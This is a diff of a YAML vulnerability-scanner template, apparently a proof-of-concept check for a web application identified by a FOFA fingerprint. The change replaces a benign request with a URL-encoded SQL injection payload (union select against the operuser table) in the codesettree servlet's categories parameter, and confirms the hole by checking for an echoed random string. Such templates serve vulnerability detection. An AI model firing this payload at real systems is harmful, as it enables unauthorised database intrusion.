@@ -10,11 +10,13 @@ info:
     FOFA: body='<div class="hj-hy-all-one-logo"'
   reference:
     - https://mp.weixin.qq.com/s/NhJe4MUepwqc6SmDJw4aow
-    
+
+set:
+  randstr: randomLowercase(12)    
 rules:
   r0:
     request:
       method: GET
-      path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31
-    expression: response.status == 200 && response.body.bcontains(b'TreeNode id=')
+      path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2c~20~27{{randstr}}~27~20from~20operuser~20~2d~2d
+    expression: response.status == 200 && response.body.bcontains(bytes(randstr))
 expression: r0()
